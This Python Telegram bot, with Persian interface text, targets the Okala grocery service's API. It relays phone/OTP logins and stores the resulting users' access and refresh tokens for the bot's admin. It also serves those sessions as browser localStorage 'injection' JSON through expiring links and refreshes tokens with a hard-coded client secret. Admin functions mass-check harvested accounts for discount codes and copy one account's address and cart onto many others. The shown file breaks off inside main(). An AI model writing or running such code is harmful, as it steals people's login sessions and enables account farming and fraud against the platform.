import os
import json
import logging
import asyncio
import uuid
import urllib.parse
import time
import io
import base64
import tempfile
import shutil
import requests
import random
import redis.asyncio as redis 
from concurrent.futures import ThreadPoolExecutor
from aiohttp import web
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

REDIS_URL = os.environ.get("REDIS_URL", "redis://localhost:6379")
redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)

WEB_DOMAIN = os.environ.get("WEB_DOMAIN", "http://localhost:8080")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0")) 

PHONE, OTP, ASK_NAME = range(3)
executor = ThreadPoolExecutor(max_workers=10)

BASE_HEADERS = {
    'accept': 'application/json, text/plain, */*',
    'source': 'okala',
    'ui-version': '2.0',
    'origin': 'https://www.okala.com',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile'
}

# ==========================================
# توابع مربوط به توکن و APIهای سیستم
# ==========================================
def get_tokens_from_file(file_path):
    access_token, refresh_token = None, None
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
            for cookie in data.get('cookies', []):
                if cookie.get('name') == 'tokenMS': access_token = cookie.get('value')
                elif cookie.get('name') == 'refresh_token': refresh_token = cookie.get('value')
            if not access_token or not refresh_token:
                for origin in data.get('origins', []):
                    for item in origin.get('localStorage', []):
                        if item.get('name') == 'tokenMS': access_token = item.get('value')
                        elif item.get('name') == 'refresh_token': refresh_token = item.get('value')
    except Exception:
        pass
    return access_token, refresh_token

def update_file_with_new_tokens(file_path, old_acc, new_acc, old_ref, new_ref):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        if old_acc and new_acc: content = content.replace(old_acc, new_acc)
        if old_ref and new_ref: content = content.replace(old_ref, new_ref)
        with open(file_path, 'w', encoding='utf-8') as f: f.write(content)
    except Exception:
        pass

def get_user_id_from_token(token):
    try:
        payload = token.split('.')[1]
        payload += '=' * (-len(payload) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload)
        data = json.loads(decoded_bytes)
        uid = data.get('userId') or data.get('alternativeCustomerId')
        return int(uid) if uid else 0
    except Exception:
        return 0

def api_refresh_token(refresh_token):
    url = "https://apigateway.okala.com/api/v1/accounts/tokens"
    data = {
        "grant_type": "refresh_token", "client_id": "customer_client_id",
        "client_secret": "u_M{'57j!%LI21#", "scope": "offline_access", "refresh_token": refresh_token
    }
    headers = {"content-type": "application/x-www-form-urlencoded"}
    try:
        res = requests.post(url, data=data, headers=headers, timeout=10)
        if res.status_code == 200:
            d = res.json()
            return d.get('access_token'), d.get('refresh_token')
    except:
        pass
    return None, None

async def api_get_address(token, uid):
    url = 'https://apigateway.okala.com/api/voyager/CustomerAddress/CustomerAddressForReact'
    headers = BASE_HEADERS.copy()
    headers['Authorization'] = f'Bearer {token}'
    loop = asyncio.get_running_loop()
    try:
        res = await loop.run_in_executor(executor, lambda: requests.get(url, headers=headers, params={'customerId': uid}, timeout=15))
        try: return res.status_code, res.json()
        except: return res.status_code, res.text
    except Exception as e:
        return 0, str(e)

async def api_get_stores(token, lat, lng, uid):
    url = 'https://apigateway.okala.com/api/Lucifer/v1/StoreRanking/GetAllStores'
    headers = BASE_HEADERS.copy()
    headers['Authorization'] = f'Bearer {token}'
    params = {'latitude': lat, 'longitude': lng, 'CustomerId': uid, 'IsMsBasketEnable': 'true'}
    loop = asyncio.get_running_loop()
    try:
        res = await loop.run_in_executor(executor, lambda: requests.get(url, headers=headers, params=params, timeout=15))
        try: return res.status_code, res.json()
        except: return res.status_code, res.text
    except Exception as e:
        return 0, str(e)

async def api_get_cart(token, uid, store_ids):
    url = 'https://apigateway.okala.com/api/Basket/v2/ShoppingCart/GetCustomerShoppingCartItems'
    headers = BASE_HEADERS.copy()
    headers['Authorization'] = f'Bearer {token}'
    params = {'CustomerId': uid, 'StoreIds': store_ids, 'isFromCartPage': 'false'}
    loop = asyncio.get_running_loop()
    try:
        res = await loop.run_in_executor(executor, lambda: requests.get(url, headers=headers, params=params, timeout=15))
        try: return res.status_code, res.json()
        except: return res.status_code, res.text
    except Exception as e:
        return 0, str(e)

async def api_add_address(token, uid, addr_data):
    url = 'https://apigateway.okala.com/api/voyager/C/CustomerAccount/AddAddress/'
    payload = {
        'id': 0, 'customerId': uid, 'mobilePhone': '', 'ShoppingSectorPartId': '0',
        'shoppingSectorId': '0', 'plaque': str(addr_data.get('plaque', '0')), 
        'unit': str(addr_data.get('unit', '1')), 'lat': float(addr_data.get('lat', 0)),
        'lng': float(addr_data.get('lng', 0)), 'title': None, 'addressTypeId': 3, 
        'oprationDuration': random.randint(10000, 20000), 
        'address': addr_data.get('address', 'آدرس ثبت شده'), 'mapPlatform': 'ParsiMap'
    }
    headers = BASE_HEADERS.copy()
    headers['Authorization'] = f'Bearer {token}'
    loop = asyncio.get_running_loop()
    try:
        res = await loop.run_in_executor(executor, lambda: requests.post(url, json=payload, headers=headers, timeout=15))
        try: return res.status_code, res.json()
        except: return res.status_code, res.text
    except Exception as e:
        return 0, str(e)

async def api_add_to_cart(token, uid, store_id, product_id):
    url = 'https://apigateway.okala.com/api/Basket/v2/ShoppingCart/AddToShoppingCart'
    payload = {
        'storeId': store_id, 'customerId': uid, 'productId': product_id, 'quantity': 1,
        'isSupplier': False, 'replaceItemMethodCode': -1, 'sectorId': '0', 'sectorPartId': '0',
        'productStoreId': '0', 'queryId': None
    }
    headers = BASE_HEADERS.copy()
    headers['Authorization'] = f'Bearer {token}'
    loop = asyncio.get_running_loop()
    try:
        res = await loop.run_in_executor(executor, lambda: requests.post(url, json=payload, headers=headers, timeout=15))
        return res.status_code == 200
    except:
        return False

async def process_discounts_and_send_report(bot, acc_keys):
    report_text = "گزارش کدهای تخفیف (دیتابیس):\n\n"
    found_any = False
    for key in acc_keys:
        phone = key.replace("account:", "")
        token_data = await redis_client.hgetall(key)
        access_token = token_data.get("access_token")
        if not access_token: continue
        user_uuid = get_user_id_from_token(access_token)
        if not user_uuid: continue
        headers = BASE_HEADERS.copy()
        headers['Authorization'] = f'Bearer {access_token}'
        url = f"https://apigateway.okala.com/api/discount/v1/discounts/customer/{user_uuid}"
        try:
            loop = asyncio.get_running_loop()
            response = await loop.run_in_executor(executor, lambda: requests.get(url, headers=headers, timeout=10))
            if response.status_code == 200:
                data = response.json()
                vouchers = data.get('data', [])
                if vouchers:
                    found_any = True
                    report_text += f"شماره {phone}: دارای {len(vouchers)} تخفیف\n"
        except Exception:
            pass
    if not found_any: report_text += "هیچ تخفیفی یافت نشد."
    if len(report_text) > 4000:
        file_out = io.BytesIO(report_text.encode('utf-8'))
        file_out.name = f"Discounts_Report_{int(time.time())}.txt"
        await bot.send_document(chat_id=ADMIN_ID, document=file_out, caption="گزارش کامل تخفیف‌ها")
    else:
        await bot.send_message(chat_id=ADMIN_ID, text=report_text)

# ==========================================
# تبدیل دیتا برای وب
# ==========================================
def format_for_injector(auth_data):
    access_token = auth_data.get("access_token", "")
    refresh_token = auth_data.get("refresh_token", "")
    user_info = auth_data.get("UserInfo", {})
    
    user_dict = {
        "id": user_info.get("Id", 0), "alternativeId": user_info.get("AlternativeId", ""), "alternativeCustomerId": user_info.get("AlternativeCustomerId", 0),
        "firstName": user_info.get("FirstName", ""), "lastName": user_info.get("LastName", ""), "birthDate": "", "genderCode": user_info.get("GenderCode", 1),
        "emailAddress": user_info.get("EmailAddress", ""), "userName": user_info.get("UserName", ""), "mobilePhone": user_info.get("MobilePhone", ""),
        "stateCode": user_info.get("StateCode", 1), "customerIsLoggedInForFirstTime": user_info.get("CustomerIsLoggedInForFirstTime", False),
        "firstLoginDateTime": user_info.get("FirstLoginDateTime", ""), "state": user_info.get("State", False),
        "hasAddress": user_info.get("HasAddress", False), "birthDateEpoch": user_info.get("BirthDateEpoch", 0)
    }
    
    user_url_encoded = urllib.parse.quote(json.dumps(user_dict, ensure_ascii=False))
    persist_user_inner = user_dict.copy()
    persist_user_inner["token"] = access_token
    
    persist_root_dict = {
        "user": json.dumps({"user": persist_user_inner, "discountCode": None}, ensure_ascii=False),
        "cart": json.dumps({"cartData": [], "totalCartsCount": 0, "showDrawer": False, "cartTotalPrice": 0}),
        "mapInfo": json.dumps({"defaultViewPort": {"latitude": 35.69976, "longitude": 51.33808, "id": 129, "name": "تهران"}, "viewport": {"latitude": 35.69976, "longitude": 51.33808}, "selectedCity": {"id": 129, "name": "تهران", "lat": 35.69975, "lng": 51.33551}, "mapCityName": "تهران"}, ensure_ascii=False),
        "eventData": json.dumps({"isLoggedIn": True, "platform": "web", "viewedLayersCount": 0, "activeDiscountCodesCount": 0, "sessionLayersViewedCount": 0}),
        "_persist": json.dumps({"version": -1, "rehydrated": True})
    }
    
    persist_root_str = json.dumps(persist_root_dict, ensure_ascii=False)
    expire_time = int(time.time()) + 31536000 
    
    return {
        "origins": [{
            "origin": "https://www.okala.com",
            "localStorage": [
                {"name": "tokenMS", "value": access_token}, {"name": "user", "value": user_url_encoded},
                {"name": "city_name", "value": "تهران"}, {"name": "city_id", "value": "129"},
                {"name": "persist:root", "value": persist_root_str}
            ]
        }]
    }

# ==========================================
# پردازش فایل زیپ
# ==========================================
async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    
    file_name = update.message.document.file_name.lower()
    if not file_name.endswith('.zip'):
        await update.message.reply_text("فایل ارسالی نامعتبر است. لطفا فایل زیپ (.zip) ارسال کنید.")
        return
        
    action = context.user_data.get('admin_zip_action', 'zip_to_link')
    msg = await update.message.reply_text("در حال دریافت و استخراج فایل...")
    
    expire_time = await redis_client.get("settings:expire_time")
    expire_time = int(expire_time) if expire_time else 7200
    
    new_file = await update.message.document.get_file()
    
    with tempfile.TemporaryDirectory() as temp_dir:
        zip_path = os.path.join(temp_dir, "uploaded.zip")
        await new_file.download_to_drive(zip_path)
        
        extracted_dir = os.path.join(temp_dir, "extracted")
        await asyncio.to_thread(shutil.unpack_archive, zip_path, extracted_dir)
        
        src_accounts = None
        for root, dirs, files in os.walk(extracted_dir):
            if 'accounts' in dirs and not src_accounts: 
                src_accounts = os.path.join(root, 'accounts')
                break
                
        if not src_accounts:
            await msg.edit_text("پوشه 'accounts' در فایل زیپ یافت نشد.")
            return

        json_files = sorted([f for f in os.listdir(src_accounts) if f.endswith('.json')])
        if not json_files:
            await msg.edit_text("هیچ فایل JSON معتبری در پوشه یافت نشد.")
            return

        if action == 'zip_sync_cart':
            await msg.edit_text("در حال جستجوی اکانت مرجع (دارای آدرس)...")
            
            template_file = None
            template_addr = None
            cart_items = []
            cart_store_id = None
            
            for filename in json_files:
                file_path = os.path.join(src_accounts, filename)
                acc_token, ref_token = get_tokens_from_file(file_path)
                if not acc_token: continue
                
                uid = get_user_id_from_token(acc_token)
                if not uid and ref_token:
                    acc_token, ref_token = api_refresh_token(ref_token)
                    uid = get_user_id_from_token(acc_token)
                    if acc_token: update_file_with_new_tokens(file_path, acc_token, acc_token, ref_token, ref_token)
                if not uid: continue
                
                status, addr_res = await api_get_address(acc_token, uid)
                if status == 200 and isinstance(addr_res, dict) and addr_res.get('data') and len(addr_res['data']) > 0:
                    template_file = filename
                    template_addr = addr_res['data'][0]
                    
                    status, stores_res = await api_get_stores(acc_token, template_addr['lat'], template_addr['lng'], uid)
                    if status == 200 and isinstance(stores_res, dict) and stores_res.get('data', {}).get('stores'):
                        store_ids = [s['storeId'] for s in stores_res['data']['stores']]
                        status, cart_res = await api_get_cart(acc_token, uid, store_ids)
                        if status == 200 and isinstance(cart_res, dict) and cart_res.get('data', {}).get('result'):
                            c_data = cart_res['data']['result'][0]
                            cart_items = c_data.get('items', [])
                            cart_store_id = c_data.get('storeId')
                    
                    break
                    
            if not template_file:
                await msg.edit_text("عملیات ناموفق: هیچ‌یک از اکانت‌های موجود دارای آدرس ثبت‌شده نبودند.")
                return
                
            if not cart_items:
                await msg.edit_text(f"اکانت مرجع یافت شد ({template_file}) اما سبد خرید آن خالی است.")
                return

            target_files = [f for f in json_files if f != template_file]
            await msg.edit_text(f"الگوی معتبر یافت شد: {template_file}\nدر حال اعمال تغییرات روی {len(target_files)} اکانت...")

            links_text = f"گزارش عملیات کپی (مرجع: {template_file}):\n\n"
            count = 0
            err_count = 0

            for filename in target_files:
                file_path = os.path.join(src_accounts, filename)
                acc_token, ref_token = get_tokens_from_file(file_path)
                if not acc_token: continue
                
                uid = get_user_id_from_token(acc_token)
                if not uid and ref_token:
                    new_acc, new_ref = api_refresh_token(ref_token)
                    if new_acc:
                        update_file_with_new_tokens(file_path, acc_token, new_acc, ref_token, new_ref)
                        acc_token = new_acc
                        uid = get_user_id_from_token(acc_token)

                if not uid: continue

                status, addr_add_res = await api_add_address(acc_token, uid, template_addr)
                address_success = (status == 200)
                
                if not address_success:
                    err_count += 1
                    continue

                added_ok = 0
                if address_success and cart_store_id:
                    for item in cart_items:
                        for _ in range(item.get('quantity', 1)):
                            ok = await api_add_to_cart(acc_token, uid, cart_store_id, item.get('productId'))
                            if ok: added_ok += 1
                            await asyncio.sleep(0.3)

                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        file_content = f.read()
                        phone = filename.replace('.json', '')
                        
                        if acc_token and not await redis_client.exists(f"account:{phone}"):
                            await redis_client.hset(f"account:{phone}", mapping={"access_token": acc_token, "refresh_token": ref_token or ""})
                        
                        link_id = str(uuid.uuid4())[:12]
                        await redis_client.setex(f"acc_link:{link_id}", expire_time, file_content)
                        
                        final_url = f"{WEB_DOMAIN}/acc/{link_id}"
                        links_text += f"شماره {phone} (کالای اضافه شده: {added_ok}):\n{final_url}\n\n"
                        count += 1
                except Exception:
                    pass

            report = f"عملیات برای {count} اکانت با موفقیت انجام شد. (خطاها: {err_count})"
            if len(links_text) > 4000:
                file_out = io.BytesIO(links_text.encode('utf-8'))
                file_out.name = f"Synced_Links_{int(time.time())}.txt"
                await context.bot.send_document(chat_id=ADMIN_ID, document=file_out, caption=report)
                await msg.delete()
            else:
                await msg.edit_text(f"{report}\n\n{links_text}", disable_web_page_preview=True)

        elif action == 'zip_to_link':
            links_text = "لیست لینک‌های تولید شده:\n\n"
            count = 0
            for filename in json_files:
                file_path = os.path.join(src_accounts, filename)
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        file_content = f.read()
                        data = json.loads(file_content)
                        access_token, refresh_token = None, None
                        for cookie in data.get('cookies', []):
                            if cookie.get('name') == 'tokenMS': access_token = cookie.get('value')
                            elif cookie.get('name') == 'refresh_token': refresh_token = cookie.get('value')
                        if not access_token:
                            for origin in data.get('origins', []):
                                for item in origin.get('localStorage', []):
                                    if item.get('name') == 'tokenMS': access_token = item.get('value')
                                    elif item.get('name') == 'refresh_token': refresh_token = item.get('value')
                        phone = filename.replace('.json', '')
                        if access_token and not await redis_client.exists(f"account:{phone}"):
                            await redis_client.hset(f"account:{phone}", mapping={"access_token": access_token, "refresh_token": refresh_token or ""})
                        link_id = str(uuid.uuid4())[:12]
                        await redis_client.setex(f"acc_link:{link_id}", expire_time, file_content)
                        final_url = f"{WEB_DOMAIN}/acc/{link_id}"
                        links_text += f"شماره {phone}:\n{final_url}\n\n"
                        count += 1
                except Exception:
                    pass
            if len(links_text) > 4000:
                file_out = io.BytesIO(links_text.encode('utf-8'))
                file_out.name = f"Links_{int(time.time())}.txt"
                await context.bot.send_document(chat_id=ADMIN_ID, document=file_out, caption=f"استخراج {count} اکانت انجام شد.")
                await msg.delete()
            else:
                await msg.edit_text(f"تعداد {count} اکانت ذخیره شد:\n\n{links_text}", disable_web_page_preview=True)

        elif action == 'zip_discount_check':
            await msg.edit_text("در حال بررسی وضعیت تخفیف‌ها. لطفا منتظر بمانید...")
            discount_dir = os.path.join(temp_dir, "Discount_Accounts")
            os.makedirs(os.path.join(discount_dir, 'accounts'), exist_ok=True)
            links_text = "لیست لینک‌های دارای تخفیف:\n\n"
            discount_count = 0
            for filename in json_files:
                file_path = os.path.join(src_accounts, filename)
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        file_content = f.read()
                        data = json.loads(file_content)
                        access_token = None
                        for cookie in data.get('cookies', []):
                            if cookie.get('name') == 'tokenMS': access_token = cookie.get('value')
                        if not access_token:
                            for origin in data.get('origins', []):
                                for item in origin.get('localStorage', []):
                                    if item.get('name') == 'tokenMS': access_token = item.get('value')
                        if access_token:
                            user_uuid = get_user_id_from_token(access_token)
                            if user_uuid:
                                headers = BASE_HEADERS.copy()
                                headers['Authorization'] = f'Bearer {access_token}'
                                url = f"https://apigateway.okala.com/api/discount/v1/discounts/customer/{user_uuid}"
                                loop = asyncio.get_running_loop()
                                response = await loop.run_in_executor(executor, lambda: requests.get(url, headers=headers, timeout=10))
                                if response.status_code == 200 and response.json().get('data'):
                                    discount_count += 1
                                    shutil.copy2(file_path, os.path.join(discount_dir, 'accounts', filename))
                                    link_id = str(uuid.uuid4())[:12]
                                    await redis_client.setex(f"acc_link:{link_id}", expire_time, file_content)
                                    phone = filename.replace('.json', '')
                                    links_text += f"شماره {phone}:\n{WEB_DOMAIN}/acc/{link_id}\n\n"
                except Exception:
                    pass
            if discount_count > 0:
                discount_zip_path = os.path.join(temp_dir, "Discounted_Accounts")
                await asyncio.to_thread(shutil.make_archive, discount_zip_path, 'zip', discount_dir)
                await msg.delete()
                with open(discount_zip_path + '.zip', 'rb') as zip_file:
                    await context.bot.send_document(chat_id=ADMIN_ID, document=zip_file, caption=f"فایل خروجی (فیلتر شده)\nتعداد اکانت‌های دارای تخفیف: {discount_count}")
                if len(links_text) > 4000:
                    file_out = io.BytesIO(links_text.encode('utf-8'))
                    file_out.name = f"Discount_Links_{int(time.time())}.txt"
                    await context.bot.send_document(chat_id=ADMIN_ID, document=file_out, caption="لینک‌های دسترسی سریع")
                else:
                    await context.bot.send_message(chat_id=ADMIN_ID, text=links_text, disable_web_page_preview=True)
            else:
                await msg.edit_text("هیچ‌یک از اکانت‌های موجود دارای تخفیف نبودند.")

# ==========================================
# مینی‌سرور وب
# ==========================================
async def web_handler_get_account(request):
    link_id = request.match_info.get('link_id', '')
    data = await redis_client.get(f"acc_link:{link_id}")
    if data:
        return web.json_response(json.loads(data))
    return web.json_response({"error": "لینک نامعتبر است یا منقضی شده."}, status=404)

async def start_web_server():
    app = web.Application()
    app.router.add_get('/acc/{link_id}', web_handler_get_account)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080)) 
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ==========================================
# منوها و دکمه‌ها
# ==========================================
def get_main_keyboard(is_admin):
    keyboard = [[InlineKeyboardButton("ورود به حساب", callback_data="user_login")]]
    if is_admin:
        keyboard.append([InlineKeyboardButton("پنل مدیریت", callback_data="admin_panel")])
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("آمار دیتابیس", callback_data="admin_stats"), InlineKeyboardButton("تنظیم انقضا", callback_data="admin_expire")],
        [InlineKeyboardButton("بررسی تخفیف دیتابیس", callback_data="admin_check_discounts")],
        [InlineKeyboardButton("تبدیل زیپ به لینک", callback_data="admin_zip_to_link"), InlineKeyboardButton("بررسی تخفیف زیپ", callback_data="admin_zip_discount")],
        [InlineKeyboardButton("کپی سبد و آدرس (الگو)", callback_data="admin_zip_sync_cart")],
        [InlineKeyboardButton("استخراج شماره‌ها", callback_data="admin_export"), InlineKeyboardButton("پاکسازی دیتابیس", callback_data="admin_clear")],
        [InlineKeyboardButton("روشن/خاموش کردن", callback_data="admin_toggle")],
        [InlineKeyboardButton("بازگشت به منوی اصلی", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    is_admin = (update.effective_user.id == ADMIN_ID)
    text = "به سیستم مدیریت حساب خوش آمدید.\nلطفا یک گزینه را انتخاب کنید:"
    if update.message:
        await update.message.reply_text(text, reply_markup=get_main_keyboard(is_admin))
    else:
        await update.callback_query.edit_message_text(text, reply_markup=get_main_keyboard(is_admin))

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    context.user_data['admin_zip_action'] = None
    await update.message.reply_text("پنل مدیریت سیستم:", reply_markup=get_admin_keyboard())

async def core_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "main_menu":
        await show_main_menu(update, context)
        return
        
    if query.from_user.id != ADMIN_ID: return
    
    if data == "admin_panel":
        context.user_data['admin_zip_action'] = None
        await query.edit_message_text("پنل مدیریت سیستم:", reply_markup=get_admin_keyboard())
        
    elif data == "admin_stats":
        acc_keys = await redis_client.keys("account:*")
        link_keys = await redis_client.keys("acc_link:*")
        maint = await redis_client.get("settings:maintenance")
        exp = await redis_client.get("settings:expire_time")
        exp = int(exp) if exp else 7200
        exp_str = f"{exp // 86400} روز" if exp >= 86400 else f"{exp // 3600} ساعت"
        status = "غیرفعال" if maint == "1" else "فعال"
        text = f"وضعیت سیستم:\n\nتعداد کل اکانت‌ها: {len(acc_keys)}\nلینک‌های فعال: {len(link_keys)}\nزمان انقضا: {exp_str}\nوضعیت ربات: {status}"
        await query.edit_message_text(text, reply_markup=get_admin_keyboard())
        
    elif data == "admin_expire":
        kb = [
            [InlineKeyboardButton("۱ ساعت", callback_data="set_exp_3600"), InlineKeyboardButton("۲۴ ساعت", callback_data="set_exp_86400")],
            [InlineKeyboardButton("۱ هفته", callback_data="set_exp_604800"), InlineKeyboardButton("۱ ماه", callback_data="set_exp_2592000")],
            [InlineKeyboardButton("بازگشت", callback_data="admin_panel")]
        ]
        await query.edit_message_text("زمان انقضای لینک‌ها را تعیین کنید:", reply_markup=InlineKeyboardMarkup(kb))
        
    elif data.startswith("set_exp_"):
        new_time = int(data.split("_")[2])
        await redis_client.set("settings:expire_time", new_time)
        exp_str = f"{new_time // 86400} روز" if new_time >= 86400 else f"{new_time // 3600} ساعت"
        await query.edit_message_text(f"انقضای لینک‌ها با موفقیت به {exp_str} تغییر یافت.", reply_markup=get_admin_keyboard())

    elif data == "admin_check_discounts":
        acc_keys = await redis_client.keys("account:*")
        if not acc_keys:
            await query.message.reply_text("دیتابیس سیستم خالی است.")
            return
        await query.message.reply_text("در حال پردازش اطلاعات. لطفا منتظر بمانید...")
        asyncio.create_task(process_discounts_and_send_report(context.bot, acc_keys))
        
    elif data == "admin_zip_to_link":
        context.user_data['admin_zip_action'] = 'zip_to_link'
        await query.message.reply_text("عملیات استخراج لینک:\nلطفا فایل مربوطه را ارسال کنید.")
        
    elif data == "admin_zip_discount":
        context.user_data['admin_zip_action'] = 'zip_discount_check'
        await query.message.reply_text("عملیات بررسی تخفیف:\nلطفا فایل مربوطه را ارسال کنید.")
        
    elif data == "admin_zip_sync_cart":
        context.user_data['admin_zip_action'] = 'zip_sync_cart'
        await query.message.reply_text("عملیات کپی سبد و آدرس:\nلطفا فایل حاوی اکانت‌ها را ارسال کنید. سیستم به صورت خودکار اکانت دارای آدرس را شناسایی کرده و تغییرات را اعمال می‌کند.")

    elif data == "admin_export":
        acc_keys = await redis_client.keys("account:*")
        if not acc_keys:
            await query.message.reply_text("دیتابیس سیستم خالی است.")
            return
        export_text = "لیست شماره‌های ثبت شده در سیستم:\n\n"
        for key in acc_keys: export_text += f"{key.replace('account:', '')}\n"
        file_out = io.BytesIO(export_text.encode('utf-8'))
        file_out.name = f"Accounts_{int(time.time())}.txt"
        await context.bot.send_document(chat_id=ADMIN_ID, document=file_out, caption="فایل دیتابیس دریافت شد.")
        
    elif data == "admin_clear":
        kb = [[InlineKeyboardButton("تایید عملیات حذف", callback_data="admin_clear_confirm"), InlineKeyboardButton("انصراف", callback_data="admin_panel")]]
        await query.edit_message_text("اخطار: این عملیات تمامی اطلاعات ثبت شده را حذف خواهد کرد. آیا تایید می‌کنید؟", reply_markup=InlineKeyboardMarkup(kb))
        
    elif data == "admin_clear_confirm":
        acc_keys = await redis_client.keys("account:*")
        if acc_keys: await redis_client.delete(*acc_keys)
        await query.edit_message_text("عملیات پاکسازی با موفقیت انجام شد.", reply_markup=get_admin_keyboard())
        
    elif data == "admin_toggle":
        current = await redis_client.get("settings:maintenance")
        new_val = "0" if current == "1" else "1"
        await redis_client.set("settings:maintenance", new_val)
        status = "غیرفعال (تعمیرات)" if new_val == "1" else "فعال"
        await query.edit_message_text(f"تغییر وضعیت سیستم:\nوضعیت کنونی: {status}", reply_markup=get_admin_keyboard())

# ==========================================
# توابع لاگین کاربر
# ==========================================
async def async_request(method, url, **kwargs):
    loop = asyncio.get_running_loop()
    if method.upper() == 'POST': return await loop.run_in_executor(executor, lambda: requests.post(url, **kwargs))
    return await loop.run_in_executor(executor, lambda: requests.get(url, **kwargs))

def get_user_headers(context: ContextTypes.DEFAULT_TYPE):
    if 'device_id' not in context.user_data:
        context.user_data['device_id'] = str(uuid.uuid4())
        context.user_data['session_id'] = str(uuid.uuid4())
    headers = BASE_HEADERS.copy()
    headers['X-User-Unique-Id'] = context.user_data['device_id']
    headers['session-id'] = context.user_data['session_id']
    return headers

async def check_maintenance(update: Update) -> bool:
    maint = await redis_client.get("settings:maintenance")
    if maint == "1" and update.effective_user.id != ADMIN_ID:
        if update.message:
            await update.message.reply_text("سیستم در حال حاضر موقتا غیرفعال است.")
        else:
            await update.callback_query.message.reply_text("سیستم در حال حاضر موقتا غیرفعال است.")
        return True
    return False

async def start_login_process(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if await check_maintenance(update): return ConversationHandler.END
    await update.callback_query.answer()
    await update.callback_query.edit_message_text("لطفا شماره موبایل خود را وارد کنید:")
    return PHONE

async def request_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if await check_maintenance(update): return ConversationHandler.END
    phone = update.message.text.strip()
    context.user_data['phone'] = phone
    url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
    payload = {"mobile": phone, "deviceTypeCode": 7, "confirmTerms": True, "notRobot": False, "otpType": 0, "ValidationCodeCreateReason": 5, "OtpApp": 0, "IsAppOnly": False}
    response = await async_request('POST', url, json=payload, headers=get_user_headers(context), timeout=15)
    if response.status_code == 200:
        await update.message.reply_text("کد تایید ارسال شد. لطفا آن را وارد کنید:")
        return OTP
    else:
        await update.message.reply_text(f"خطا در ارتباط با سیستم عامل: {response.status_code}")
        return ConversationHandler.END

async def verify_otp_and_check_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp_code = update.message.text.strip()
    phone = context.user_data.get('phone')
    msg = await update.message.reply_text("در حال پردازش درخواست...")
    token_url = "https://apigateway.okala.com/api/v1/accounts/tokens"
    payload = {"mobile_number": phone, "otp_code": otp_code, "grant_type": "customer_grant_type", "client_id": "customer_client_id", "client_secret": "u_M{'57j!%LI21#", "client_name": "customer_client_name", "device_type_code": 7, "scope": "offline_access", "loginDuration": 4815}
    headers = get_user_headers(context)
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    response = await async_request('POST', token_url, data=payload, headers=headers)
    if response.status_code == 200:
        auth_data = response.json()
        context.user_data['auth_data'] = auth_data 
        if auth_data.get("access_token"):
            await redis_client.hset(f"account:{phone}", mapping={"access_token": auth_data.get("access_token"), "refresh_token": auth_data.get("refresh_token")})
        if not auth_data.get("UserInfo", {}).get("HasName", False):
            await msg.edit_text("اطلاعات حساب ناقص است. لطفا نام و نام خانوادگی خود را وارد کنید:")
            return ASK_NAME
        else:
            return await generate_and_send_link(update, context, msg)
    else:
        await msg.edit_text("کد وارد شده معتبر نمی‌باشد. لطفا مجددا تلاش کنید.")
        return ConversationHandler.END

async def save_name_and_continue(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    full_name = update.message.text.strip()
    if not full_name: return ASK_NAME
    parts = full_name.split(maxsplit=1)
    msg = await update.message.reply_text("در حال ثبت اطلاعات...")
    url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/UpdateCustomer" 
    headers = get_user_headers(context)
    headers["Authorization"] = f"Bearer {context.user_data['auth_data'].get('access_token')}"
    payload = {"birthDate": "", "birthDateEpoch": 700086600, "customerType": 0, "firstName": parts[0], "genderCode": 1, "genderTitle": "مذکر", "lastName": parts[1] if len(parts)>1 else "", "gender": "male"}
    await async_request('POST', url, json=payload, headers=headers)
    return await generate_and_send_link(update, context, msg)

async def generate_and_send_link(update: Update, context: ContextTypes.DEFAULT_TYPE, status_msg) -> int:
    auth_data = context.user_data.get('auth_data')
    injection_json = format_for_injector(auth_data)
    link_id = str(uuid.uuid4())[:12]
    expire_time = await redis_client.get("settings:expire_time")
    expire_time = int(expire_time) if expire_time else 7200
    await redis_client.setex(f"acc_link:{link_id}", expire_time, json.dumps(injection_json, ensure_ascii=False))
    final_url = f"{WEB_DOMAIN}/acc/{link_id}"
    exp_str = f"{expire_time // 86400} روز" if expire_time >= 86400 else f"{expire_time // 3600} ساعت"
    await status_msg.edit_text(f"ورود با موفقیت انجام شد.\n\n{final_url}\n\n(لینک دریافتی تا {exp_str} آینده معتبر خواهد بود)", disable_web_page_preview=True)
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("عملیات متوقف شد.")
    return ConversationHandler.END

# ==========================================
# راه‌اندازی اصلی
# ==========================================
async def main():
    BOT_TOKEN = os.environ.get("BOT_TOKEN")
    if not BOT_TOKEN:
        logging.error("BOT_TOKEN environment variable is missing.")
